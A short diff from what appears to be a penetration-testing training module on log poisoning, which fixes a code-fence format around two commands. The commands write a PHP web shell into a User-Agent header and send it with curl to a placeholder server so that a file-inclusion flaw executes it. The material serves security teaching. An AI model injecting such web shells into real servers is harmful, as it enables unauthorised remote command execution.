@@ -93,8 +93,7 @@ As expected, our custom User-Agent value is visible in the included log file. No
 
 We may also poison the log by sending a request through cURL, as follows:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
 hiimeins@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
 ```
